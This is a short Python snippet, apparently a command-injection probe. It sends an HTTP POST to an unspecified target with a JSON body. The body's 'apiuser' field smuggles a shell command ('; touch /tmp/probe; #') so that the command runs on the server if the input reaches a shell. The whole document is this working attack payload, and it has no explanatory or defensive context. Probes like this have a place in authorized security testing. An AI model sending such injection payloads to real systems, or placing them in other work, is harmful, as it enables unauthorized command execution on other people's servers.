import requests

payload = "{\"apiuser\":\"'; touch /tmp/probe; #\"}"
requests.post(target, data=payload)
